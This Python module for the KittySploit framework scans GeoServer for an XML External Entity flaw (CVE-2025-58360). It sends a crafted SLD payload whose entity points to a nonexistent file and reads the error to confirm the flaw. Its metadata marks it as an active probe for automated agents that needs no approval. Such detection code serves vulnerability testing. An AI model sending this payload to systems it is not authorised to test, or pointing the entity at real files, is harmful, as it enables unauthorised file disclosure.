#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""GeoServer 2."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'GeoServer - XML External Entity Injection Detection',
        'description': 'GeoServer 2.26.0 to 2.26.2 and 2.25.6 contains an XML External Entity (XXE) injection caused by insufficient sanitization of XML input in /geoserver/wms GetMap operation, letting attackers disclose files or cause DoS, exploit requires crafted XML input.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2025', 'geoserver', 'xxe', 'wms', 'vkev', 'kev'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://github.com/geoserver/geoserver/security/advisories/GHSA-fjf5-xgmq-5525',
            'https://nvd.nist.gov/vuln/detail/CVE-2025-58360',
        ],
        'cve': 'CVE-2025-58360',
    }

    def run(self):
        for path in ('/geoserver/wfs?service=WMS&request=GetMap', '/wfs?service=WMS&request=GetMap'):
            r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/vnd.ogc.sld+xml'}, data='<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE root [ <!ENTITY xxe SYSTEM "/this_file_does_not_exist"> ]>\n<StyledLayerDescriptor version="1.0.0">\n<NamedLayer><Name>&xxe;</Name></NamedLayer>\n</StyledLayerDescriptor>\n')
            if not r or r.status_code != 200:
                continue
            body = r.text or ""
            body_all = ('ServiceException', 'java.io.FileNotFoundException',)
            if all(m in body for m in body_all):
                self.set_info(
                    severity='high',
                    reason='GeoServer - XML External Entity Injection detected',
                    path=path,
                )
                return True
        return False

